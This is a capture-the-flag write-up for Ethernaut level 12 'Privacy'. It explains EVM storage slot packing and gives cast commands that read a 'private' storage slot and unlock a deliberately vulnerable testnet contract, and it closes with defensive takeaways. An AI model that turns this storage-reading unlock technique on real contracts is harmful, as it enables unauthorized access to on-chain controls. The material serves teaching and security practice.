# 12 - Privacy

## Overview

- **Difficulty:** 6/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0x4dd4d658B208Bf93945e3b4D8b681EE54557517D`](https://sepolia.etherscan.io/address/0x4dd4d658B208Bf93945e3b4D8b681EE54557517D)
- **Transactions:**
  - **1. Exploit (`unlock(bytes16)`):** [`0xedd7d8f50771d0f5157e1f458736e7ec25e871eccf5489b3ea280ad1bcd14034`](https://sepolia.etherscan.io/tx/0xedd7d8f50771d0f5157e1f458736e7ec25e871eccf5489b3ea280ad1bcd14034)
  - **2. Level Submission:** [`0x204d8d1789dc786550927cf8bdbe1996584dbab40256812002dbd05c335da4f6`](https://sepolia.etherscan.io/tx/0x204d8d1789dc786550927cf8bdbe1996584dbab40256812002dbd05c335da4f6)

---

## Objective

Unlock the `Privacy` contract by flipping `locked` to `false`.

---

## Contract Analysis

The target contract is [`src/12-privacy/Privacy.sol`](./Privacy.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

---

### Vulnerability Breakdown: EVM Storage Layout & Slot Packing

Similar to Level 08 (Vault), `private` visibility does not hide data from off-chain observers. Any value stored in contract state can be inspected via the `eth_getStorageAt` RPC endpoint or Foundry's `cast storage`.

To find the secret key (`data[2]`), we must map out the exact **storage slot layout** based on Solidity's packing rules:

1. **Slot Size:** Storage slots are 32 bytes (256 bits) each, indexed starting from `0`.
2. **Variable Packing:** Multiple contiguous variables are packed into the same 32-byte slot if their combined size is $\le 32$ bytes.
3. **Array Allocation:** Fixed-size arrays always start on a new slot, and their elements are laid out sequentially.

#### Detailed Storage Slot Mapping

| Slot Index | Variable(s)                                     | Type                           |            Size             | Notes                                                                                           |
| :--------: | :---------------------------------------------- | :----------------------------- | :-------------------------: | :---------------------------------------------------------------------------------------------- |
|   **0**    | `locked`                                        | `bool`                         |           1 byte            | Occupies byte 0. (31 bytes remaining in slot 0).                                                |
|   **1**    | `ID`                                            | `uint256`                      |          32 bytes           | Cannot fit in the remaining 31 bytes of Slot 0; starts on **Slot 1**.                           |
|   **2**    | `flattening`<br>`denomination`<br>`awkwardness` | `uint8`<br>`uint8`<br>`uint16` | 1 byte<br>1 byte<br>2 bytes | **Packed together!** Total = $1 + 1 + 2 = 4$ bytes $\le 32$ bytes. Fits entirely in **Slot 2**. |
|   **3**    | `data[0]`                                       | `bytes32`                      |          32 bytes           | First element of fixed-size array. Occupies entire **Slot 3**.                                  |
|   **4**    | `data[1]`                                       | `bytes32`                      |          32 bytes           | Second element. Occupies entire **Slot 4**.                                                     |
|   **5**    | `data[2]`                                       | `bytes32`                      |          32 bytes           | **Target secret key!** Occupies entire **Slot 5**.                                              |

`data[2]` is located at **Slot 5**!

---

### Type Casting & Truncation: `bytes32` to `bytes16`

The `unlock` function requires:

```solidity
require(_key == bytes16(data[2]));
```

In Solidity:

- Casting from a larger fixed-size byte array (`bytes32`) to a smaller one (`bytes16`) **truncates from the right**, preserving the **leftmost 16 bytes** (the high-order bytes).
- Contrast this with integer casting (e.g. `uint256` to `uint128`), which truncates from the left, keeping the lowest-order bytes on the right.

```text
Full 32-byte Slot 5 value:
0x 4935bcd013b074fc7338c8489b44853f 98a93bbe0850b942fa334533bea700a0
  └────────── 16 bytes ────────────┘ └────────── 16 bytes ────────────┘
        (First 16 bytes kept)                  (Truncated)

Resulting bytes16 key:
0x4935bcd013b074fc7338c8489b44853f
```

---

## Step-by-Step Exploit Walkthrough

No helper contract is required. The exploit is executed entirely via Foundry's `cast`.

### 1. Read Slot 5 from Storage

Query storage slot 5 on Sepolia:

```bash
cast storage 0x4dd4d658B208Bf93945e3b4D8b681EE54557517D 5 --rpc-url sepolia
```

- **Output:**
  ```text
  0x4935bcd013b074fc7338c8489b44853f98a93bbe0850b942fa334533bea700a0
  ```

### 2. Extract the First 16 Bytes

Take the prefix `0x` plus the first 32 hexadecimal characters (16 bytes):

```text
0x4935bcd013b074fc7338c8489b44853f
```

_(Terminal shortcut: `cast storage ... | cut -c 1-34` or in PowerShell: `(cast storage ...).Substring(0, 34)`)_

### 3. Unlock the Contract

Call `unlock(bytes16)` passing the 16-byte key:

```bash
cast send 0x4dd4d658B208Bf93945e3b4D8b681EE54557517D \
  "unlock(bytes16)" 0x4935bcd013b074fc7338c8489b44853f \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Exploit Tx:** [`0xedd7d8f50771d0f5157e1f458736e7ec25e871eccf5489b3ea280ad1bcd14034`](https://sepolia.etherscan.io/tx/0xedd7d8f50771d0f5157e1f458736e7ec25e871eccf5489b3ea280ad1bcd14034)

### 4. Verify Unlock State

Check that `locked` is now `false`:

```bash
cast call 0x4dd4d658B208Bf93945e3b4D8b681EE54557517D "locked()(bool)" --rpc-url sepolia
# Output: false
```

### 5. Submit Level

Submit the instance on the Ethernaut dashboard:

- **Submission Tx:** [`0x204d8d1789dc786550927cf8bdbe1996584dbab40256812002dbd05c335da4f6`](https://sepolia.etherscan.io/tx/0x204d8d1789dc786550927cf8bdbe1996584dbab40256812002dbd05c335da4f6)

---

## Key Security Takeaways

1. **Storage Packing is an Optimization, Not an Obfuscation:**
   Solidity packs smaller data types into 32-byte words to conserve gas (`SSTORE` is one of the most expensive opcodes in the EVM). However, packing provides zero secrecy or protection.
2. **Byte Truncation vs Integer Truncation:**
   - Byte arrays (`bytesN`) represent raw binary data left-aligned (big-endian string-style); downcasting truncates from the right.
   - Integers (`uintN`) represent numeric values right-aligned; downcasting discards higher-order bits (truncates from the left).
3. **Never Store Authentication Secrets On-Chain:**
   Any sensitive verification logic that relies on keeping a secret key on-chain is fundamentally broken. Use asymmetric cryptographic signatures (e.g. ECDSA `ecrecover`), Merkle proofs, or Zero-Knowledge Proofs (ZKPs) for on-chain authorization.
